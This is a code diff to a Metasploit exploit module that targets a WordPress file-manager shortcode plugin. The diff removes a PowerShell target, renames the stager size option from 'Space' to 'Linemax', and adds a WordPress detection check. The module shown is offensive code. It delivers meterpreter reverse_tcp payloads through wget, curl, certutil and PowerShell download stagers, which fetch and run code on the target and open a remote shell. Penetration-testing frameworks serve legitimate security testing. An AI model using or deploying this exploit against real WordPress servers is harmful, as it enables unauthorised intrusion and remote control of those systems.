@@ -3,16 +3,14 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/exploit/powershell'
-
 class MetasploitModule < Msf::Exploit::Remote
   Rank = ExcellentRanking
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::CmdStager
   include Msf::Exploit::FileDropper
-  include Msf::Exploit::Powershell
   include Msf::Exploit::Format::PhpPayloadPng
+  include Msf::Exploit::Remote::HTTP::Wordpress
   prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
@@ -72,7 +70,7 @@ class MetasploitModule < Msf::Exploit::Remote
               'Platform' => 'linux',
               'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
               'Type' => :linux_dropper,
-              'Space' => 65535,
+              'Linemax' => 65535,
               'CmdStagerFlavor' => ['wget', 'curl', 'printf', 'bourne'],
               'DefaultOptions' => {
                 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
@@ -91,23 +89,12 @@ class MetasploitModule < Msf::Exploit::Remote
             }
           ],
           [
-            'Windows Powershell',
-            {
-              'Platform' => 'win',
-              'Arch' => [ARCH_X64, ARCH_X86],
-              'Type' => :windows_powershell,
-              'DefaultOptions' => {
-                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
-              }
-            }
-          ],
-          [
             'Windows Dropper',
             {
               'Platform' => 'win',
               'Arch' => [ARCH_X64, ARCH_X86],
               'Type' => :windows_dropper,
-              'Space' => 3000,
+              'Linemax' => 3000,
               'CmdStagerFlavor' => ['psh_invokewebrequest', 'vbs', 'debug_asm', 'debug_write', 'certutil'],
               'DefaultOptions' => {
                 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
@@ -274,7 +261,6 @@ class MetasploitModule < Msf::Exploit::Remote
       else
         @wp_data['path'] = path_match2[0].split(',')[0].split(':')[1].tr('"', '').strip
       end
-      print_status("path: #{@wp_data['path']}")
 
       # 3. Determine Wordpress baseurl
       # search in html content for:
@@ -284,11 +270,12 @@ class MetasploitModule < Msf::Exploit::Remote
       return if baseurl_match.nil?
 
       @wp_data['baseurl'] = baseurl_match[0].split('/wp-content')[0].split('/')[3]
-      print_status("base_url: #{@wp_data['baseurl']}")
     end
   end
 
   def check
+    return CheckCode::Safe('Server not online or not detected as WordPress.') unless wordpress_and_online?
+
     check_fma_shortcode_plugin
     return CheckCode::Safe("Could not find fmakey. Shortcode plugin not installed or check your TARGETURI \"#{datastore['TARGETURI']}\" setting.") if @wp_data['fmakey'].nil?
 
@@ -310,9 +297,7 @@ class MetasploitModule < Msf::Exploit::Remote
     when :unix_cmd, :windows_cmd
       execute_command(payload.encoded)
     when :linux_dropper, :windows_dropper
-      execute_cmdstager({ linemax: target.opts['Space'] })
-    when :windows_powershell
-      execute_command(cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true))
+      execute_cmdstager({ linemax: target.opts['Linemax'] })
     end
   end
 end
